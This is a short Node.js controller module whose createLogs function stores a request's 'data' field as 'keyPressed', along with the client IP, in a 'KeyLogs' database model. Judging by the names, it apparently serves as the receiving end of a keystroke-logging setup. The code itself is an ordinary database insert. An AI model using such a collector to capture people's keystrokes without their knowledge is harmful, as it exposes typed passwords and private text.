const KeyLogs = require("../../models/schemas/keylogs");

const createLogs = async ({ body, ip }) => {
	try {
		const { data } = body;
		const newLogs = await KeyLogs.create({ ip, keyPressed: data });

		return {
			success: true,
			payload: newLogs,
		};
	} catch (err) {
		console.log(err.stack);
		return {
			success: false,
			message: err.message,
		};
	}
};

module.exports = { createLogs };
